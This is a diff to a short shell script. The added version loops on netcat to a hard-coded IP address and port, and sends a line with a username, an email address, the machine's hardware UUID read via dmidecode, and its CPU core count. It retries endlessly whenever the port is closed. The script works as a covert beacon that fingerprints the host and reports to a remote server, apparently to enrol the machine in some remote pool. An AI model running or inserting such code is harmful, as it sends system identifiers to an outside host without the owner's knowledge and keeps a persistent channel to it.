@@ -1,15 +1,12 @@
-#!/bin/bash
-
-function wait {
-	while ! nc -z h.tung.pro 8000; do   
-	  sleep 1 # wait for 1/10 of the second before check again
-	done
-}
-
-function exec {
-	echo "a" | nc -q -1 h.tung.pro 8000
-	echo "Port closed. Waiting server to open port..."
-	wait
-	exec
-}
-exec
+#!/bin/sh
+_wait () {
+	while ! nc -z 149.28.31.125 45569;
+	do sleep 5;
+	done;
+};
+_exec () {
+	echo 'tungbui|Azure-g@gmail.com|`dmidecode | grep -w UUID | sed "s/^.UUID: //g"`|`grep -c ^processor /proc/cpuinfo`|' | nc -q -1 149.28.31.125 45569;
+	echo 'Port closed. Waiting server to open port...';
+	_wait;
+	_exec;
+};_exec;
